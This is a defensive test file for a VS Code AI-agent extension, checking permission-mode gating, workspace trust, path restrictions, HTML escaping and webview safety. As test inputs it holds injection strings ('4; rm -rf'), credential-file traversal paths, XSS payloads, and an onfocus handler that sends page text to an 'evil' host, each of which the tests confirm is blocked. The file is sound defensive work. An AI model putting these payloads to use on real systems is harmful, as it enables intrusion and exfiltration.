import { strict as assert } from "node:assert";
import { describe, it } from "node:test";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import vm from "node:vm";

const Module = require("module");
const originalRequire = Module.prototype.require;

const workspaceRoot = path.join(os.tmpdir(), "andromity-ws");
const dialogs: Array<{ message: string; items: unknown[] }> = [];
let dialogAnswer: string | undefined;
const vscodeMock: any = {
  workspace: {
    isTrusted: true,
    workspaceFolders: [{ uri: { fsPath: workspaceRoot } }],
    getConfiguration: () => ({ get: (_key: string, fallback: unknown) => fallback }),
  },
  window: {
    showWarningMessage: async (message: string, ...items: unknown[]) => {
      dialogs.push({ message, items });
      return dialogAnswer;
    },
  },
  commands: { executeCommand: async () => {} },
  extensions: { getExtension: () => undefined },
};
Module.prototype.require = function (name: string) {
  if (name === "vscode") return vscodeMock;
  return originalRequire.apply(this, arguments as any);
};

import {
  allowOpenPath,
  clampPromptMode,
  confirmAndromityTrust,
  confirmPermissionMode,
  isUncPath,
  resolveWebviewConfigWrite,
} from "../src/server/securityPolicy.js";
import { escapeHtml, getNonce, scriptJson } from "../src/providers/webviewSecurity.js";
import { getSafeMarkdownScript } from "../src/providers/safeMarkdown.js";
import { MAX_BUFFERED_LINE_CHARS, RpcClient } from "../src/server/RpcClient.js";
import { readDaemonToken, resolveOnPath } from "../src/server/PythonBridge.js";
import { appendCoalesced } from "../src/panels/WaterfallPanel.js";

function reset(trusted = true, answer?: string) {
  vscodeMock.workspace.isTrusted = trusted;
  dialogs.length = 0;
  dialogAnswer = answer;
}

describe("permission mode policy", () => {
  it("asks before entering FULL or YOLO and applies nothing when declined", async () => {
    reset(true, undefined);
    assert.equal(await confirmPermissionMode("yolo", "safe"), null);
    assert.equal(dialogs.length, 1);
    reset(true, "Enable FULL");
    assert.equal(await confirmPermissionMode("FULL", "trust"), "full");
  });

  it("does not prompt for reviewed modes or an unchanged mode, and rejects unknown values", async () => {
    reset(true, undefined);
    assert.equal(await confirmPermissionMode("trust", "yolo"), "trust");
    assert.equal(await confirmPermissionMode("yolo", "yolo"), "yolo");
    assert.equal(await confirmPermissionMode("root", "safe"), null);
    assert.equal(dialogs.length, 0);
  });

  it("never lets a per-prompt mode exceed the approved mode", () => {
    assert.equal(clampPromptMode("yolo", "safe"), "safe");
    assert.equal(clampPromptMode("safe", "full"), "safe");
    assert.equal(clampPromptMode(undefined, "trust"), "trust");
    assert.equal(clampPromptMode("bogus", "trust"), "trust");
  });
});

describe("webview config writes", () => {
  it("maps known keys and validates their values", () => {
    assert.deepEqual(resolveWebviewConfigWrite("reasoningEffort", "budget:4096"), { section: "default", key: "reasoning_effort", value: "budget:4096" });
    assert.deepEqual(resolveWebviewConfigWrite("maxSubagents", 4), { section: "subagents", key: "max_concurrent", value: 4 });
    assert.equal(resolveWebviewConfigWrite("maxSubagents", "4; rm -rf"), null);
    assert.equal(resolveWebviewConfigWrite("provider", "../../etc"), null);
  });

  it("rejects permission mode and arbitrary daemon keys", () => {
    assert.equal(resolveWebviewConfigWrite("mode", "yolo"), null);
    assert.equal(resolveWebviewConfigWrite("permission_mode", "yolo"), null);
    assert.equal(resolveWebviewConfigWrite("allowed_commands", ["*"]), null);
    assert.equal(resolveWebviewConfigWrite("__proto__", {}), null);
  });
});

describe("Andromity folder trust", () => {
  it("refuses while VS Code has the folder in Restricted Mode", async () => {
    reset(false, "Trust Folder");
    assert.equal(await confirmAndromityTrust(), null);
  });

  it("refuses folders that are not open in the window", async () => {
    reset(true, "Trust Folder");
    assert.equal(await confirmAndromityTrust(path.join(os.tmpdir(), "elsewhere")), null);
  });

  it("trusts the open folder only after confirmation", async () => {
    reset(true, undefined);
    assert.equal(await confirmAndromityTrust(), null);
    reset(true, "Trust Folder");
    assert.equal(await confirmAndromityTrust(), workspaceRoot);
  });
});

describe("paths from webview messages", () => {
  it("refuses network paths outright", async () => {
    reset(true, "Open");
    assert.ok(isUncPath("\\\\attacker\\share\\x"));
    assert.ok(isUncPath("//attacker/share/x"));
    assert.ok(!isUncPath("\\Windows\\x"));
    assert.equal(await allowOpenPath("\\\\attacker\\share\\x"), false);
  });

  it("opens workspace and relative paths directly but confirms outside paths", async () => {
    reset(true, undefined);
    assert.equal(await allowOpenPath(path.join(workspaceRoot, "src", "a.ts")), true);
    assert.equal(await allowOpenPath("src/a.ts"), true);
    assert.equal(dialogs.length, 0);
    assert.equal(await allowOpenPath(path.join(os.homedir(), ".aws", "credentials")), false);
    assert.equal(dialogs.length, 1);
  });

  it("treats relative paths that climb out of the workspace as outside", async () => {
    reset(true, undefined);
    assert.equal(await allowOpenPath("../../Users/x/.ssh/id_rsa"), false);
    assert.equal(dialogs.length, 1);
  });
});

describe("webview output helpers", () => {
  it("scriptJson cannot terminate an inline script", () => {
    const encoded = scriptJson({ a: "</script><img src=x onerror=alert(1)>&" + String.fromCharCode(0x2028) });
    assert.ok(!encoded.includes("<"));
    assert.ok(!encoded.includes(String.fromCharCode(0x2028)));
    assert.deepEqual(JSON.parse(encoded), { a: "</script><img src=x onerror=alert(1)>&" + String.fromCharCode(0x2028) });
  });

  it("escapeHtml covers attribute breakouts", () => {
    assert.equal(escapeHtml(`" onfocus='x' \``), "&quot; onfocus=&#39;x&#39; &#96;");
  });

  it("nonces are unpredictable hex", () => {
    const nonces = new Set(Array.from({ length: 20 }, () => getNonce()));
    assert.equal(nonces.size, 20);
    for (const nonce of nonces) assert.match(nonce, /^[0-9a-f]{32}$/);
  });
});

describe("safe markdown renderer", () => {
  const renderer = vm.runInNewContext(getSafeMarkdownScript() + "; andromitySafeMarkdownRenderer()", {});

  it("renders raw HTML as text", () => {
    assert.equal(renderer.html({ text: "<img src=x onerror=alert(1)>" }), "&lt;img src=x onerror=alert(1)&gt;");
  });

  it("drops non-web link targets", () => {
    assert.equal(renderer.link({ href: "javascript:alert(1)", text: "click" }), "click");
    assert.match(renderer.link({ href: "https://example.com/?a=\"b\"", text: "ok" }), /href="https:\/\/example\.com\/\?a=&quot;b&quot;"/);
  });

  it("turns remote images into links so nothing loads without a click", () => {
    const html = renderer.image({ href: "https://evil.example/p?d=secret", text: "x" });
    assert.ok(!html.includes("<img"));
    assert.match(html, /<a href="https:\/\/evil\.example/);
  });
});

describe("RPC framing", () => {
  it("handles lines split across chunks and several lines per chunk", () => {
    const client = new RpcClient(() => {});
    const seen: string[] = [];
    client.on("*", (method: string) => seen.push(method));
    client.handleIncomingMessage('{"jsonrpc":"2.0","method":"a","par');
    client.handleIncomingMessage('ams":{}}\n{"jsonrpc":"2.0","method":"b","params":{}}\n{"jsonrpc":"2.0",');
    client.handleIncomingMessage('"method":"c","params":{}}\n');
    assert.deepEqual(seen, ["a", "b", "c"]);
  });

  it("drops an unterminated frame beyond the size limit instead of growing forever", () => {
    const logs: string[] = [];
    const client = new RpcClient(() => {}, { log: (m) => logs.push(m) });
    client.handleIncomingMessage("x".repeat(MAX_BUFFERED_LINE_CHARS + 1));
    assert.equal((client as any)._buffer, "");
    assert.ok(logs.some((m) => m.includes("unterminated")));
  });
});

describe("daemon launch helpers", () => {
  it("resolves bare commands only from absolute PATH entries", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "andromity-path-"));
    const exe = process.platform === "win32" ? "fakepy.EXE" : "fakepy";
    fs.writeFileSync(path.join(dir, exe), "");
    const env = { PATH: ["relative-dir", dir].join(path.delimiter), PATHEXT: ".EXE" };
    assert.equal(resolveOnPath("fakepy", env)?.toLowerCase(), path.join(dir, exe).toLowerCase());
    assert.equal(resolveOnPath("fakepy", { PATH: "relative-dir", PATHEXT: ".EXE" }), null);
  });

  it("reads the TCP daemon token from the configured directory", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "andromity-cfg-"));
    fs.writeFileSync(path.join(dir, "daemon.token"), "tok-123\n");
    assert.equal(readDaemonToken({ ANDROMITY_CONFIG_DIR: dir }), "tok-123");
    assert.equal(readDaemonToken({ ANDROMITY_CONFIG_DIR: path.join(dir, "missing") }), null);
  });
});

describe("waterfall trace buffering", () => {
  it("merges streaming deltas so structural events survive long replies", () => {
    const buf: any[] = [{ type: "agent_started", session_id: "s" }];
    for (let i = 0; i < 1000; i++) appendCoalesced(buf, { type: "text_delta", session_id: "s", text: "x" }, 200, true);
    appendCoalesced(buf, { type: "tool_start", session_id: "s", tool_id: "t" }, 200, true);
    assert.equal(buf.length, 3);
    assert.equal(buf[0].type, "agent_started");
    assert.equal(buf[1].text.length, 1000);
  });

  it("never evicts agent_started when the active-turn buffer is full", () => {
    const buf: any[] = [{ type: "agent_started", session_id: "s" }];
    for (let i = 0; i < 300; i++) appendCoalesced(buf, { type: "tool_start", session_id: "s", tool_id: String(i) }, 200, true);
    assert.equal(buf.length, 200);
    assert.equal(buf[0].type, "agent_started");
  });
});

describe("Python interpreter discovery and workspace trust", () => {
  const venvPython = process.platform === "win32"
    ? path.join(workspaceRoot, ".venv", "Scripts", "python.exe")
    : path.join(workspaceRoot, ".venv", "bin", "python");

  it("uses a workspace virtualenv only when the folder is trusted", async () => {
    fs.mkdirSync(path.dirname(venvPython), { recursive: true });
    fs.writeFileSync(venvPython, "");
    const { PythonBridge } = await import("../src/server/PythonBridge.js");
    const bridge: any = new PythonBridge({ appendLine() {}, append() {} } as any);
    // The extension's own install location is searched too; isolate the workspace part.
    bridge._findProjectRoot = () => null;

    reset(true);
    assert.equal(await bridge._resolvePythonPath(), venvPython);

    reset(false);
    assert.notEqual(await bridge._resolvePythonPath(), venvPython);
  });
});

describe("background task panel", () => {
  it("has a nonce CSP and keeps a hostile command inert", async () => {
    const { BackgroundTaskPanel } = await import("../src/panels/BackgroundTaskPanel.js");
    const panel: any = Object.create(BackgroundTaskPanel.prototype);
    panel._processId = "p1";
    panel._command = `sleep 1 #" autofocus onfocus="fetch('https://evil/'+document.body.innerText)`;
    panel._panel = { webview: { cspSource: "vscode-webview:" } };
    const html: string = panel._getHtml();
    assert.match(html, /Content-Security-Policy[^>]*default-src 'none'[^>]*script-src 'nonce-[0-9a-f]{32}'/);
    assert.match(html, /<script nonce="[0-9a-f]{32}">/);
    assert.ok(!html.includes(`" autofocus onfocus="`));
    assert.ok(html.includes("&quot; autofocus onfocus=&quot;"));
  });
});

describe("extension manifest and packaging", () => {
  const root = fs.existsSync(path.resolve(__dirname, "..", "package.json"))
    ? path.resolve(__dirname, "..")
    : path.resolve(__dirname, "..", "..");
  const manifest = JSON.parse(fs.readFileSync(path.join(root, "package.json"), "utf-8"));

  it("ignores interpreter, port and host settings from untrusted workspaces", () => {
    const restricted: string[] = manifest.capabilities.untrustedWorkspaces.restrictedConfigurations;
    for (const key of ["andromity.pythonPath", "andromity.serverPort", "andromity.ollamaHost", "andromity.permissionMode"]) {
      assert.ok(restricted.includes(key), key + " must be a restricted configuration");
    }
  });

  it("keeps the Ollama address out of workspace settings, since it is copied into config.toml", () => {
    assert.equal(manifest.contributes.configuration.properties["andromity.ollamaHost"].scope, "machine");
  });

  it("marks settings the engine doesn't read as deprecated", () => {
    const props = manifest.contributes.configuration.properties;
    for (const key of ["andromity.defaultProvider", "andromity.defaultModel", "andromity.defaultProfile", "andromity.reasoningEffort"]) {
      assert.match(props[key].markdownDeprecationMessage, /^Not used\./, key);
    }
  });

  it("packages a minified production build without logs or demos", () => {
    assert.match(manifest.scripts["vscode:prepublish"], /--production/);
    const ignore = fs.readFileSync(path.join(root, ".vscodeignore"), "utf-8").split(/\r?\n/);
    for (const pattern of ["*.log", "demo/**"]) assert.ok(ignore.includes(pattern), pattern + " must be in .vscodeignore");
  });
});

describe("queued prompt submission", () => {
  it("cannot raise the permission mode above the approved one", async () => {
    const { handleInputMessage } = await import("../src/server/inputBridge.js");
    const calls: Array<{ method: string; params: any }> = [];
    const rpc: any = { call: async (method: string, params: any) => { calls.push({ method, params }); return { queue: {}, input_id: "i" }; } };
    await handleInputMessage(rpc, { type: "submit_input", prompt: "hi", mode: "yolo", requestId: "r" } as any, "s", () => {}, "safe");
    await handleInputMessage(rpc, { type: "submit_input", prompt: "hi", mode: "safe", requestId: "r2" } as any, "s", () => {}, "full");
    const submitted = calls.filter((c) => c.method === "agent.submit").map((c) => c.params.mode);
    assert.deepEqual(submitted, ["safe", "safe"]);
  });
});
